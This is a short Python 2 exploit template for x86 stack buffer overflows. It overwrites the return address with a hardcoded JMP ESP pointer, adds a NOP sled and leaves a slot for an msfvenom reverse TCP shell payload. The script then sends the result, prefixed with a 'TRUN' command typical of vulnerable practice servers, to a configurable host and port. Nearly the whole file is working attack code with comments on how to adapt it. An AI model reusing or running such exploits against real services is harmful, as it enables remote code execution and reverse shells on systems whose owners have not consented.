#!/usr/bin/python
# This is a semi-adjustable buffer overflow script.
# User still needs to modify vars labeled below.
# User still needs to fuzz system for buffer size before EIP.
# User still needs to network capture CMD prefix for beginning socket connection.
# Script meant for x86 systems due to register keys such as JMP ESP.

import sys, socket

overflow = ("") #msfvenom generate hex payload for reverse tcp connection. Make sure to scan for bad chars!!!
SIZE = 200 #change this (size of buffer)
RHOST = '127.0.0.1' #change this
RPORT = 80 #change this
CMD = 'TRUN /.:/' #change this

shellcode = "A" * SIZE + "\xad\x11\x58\x62" + "\x90" * 8  + overflow
#\x90 - padding NOP command
#\xad\x11\x58\x62 - x86 memory pointer to JMP ESP instruction 

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((RHOST,RPORT))
  s.send((CMD + shellcode))
  s.close()
  
except:
  print "Error connecting..."
  sys.exit()
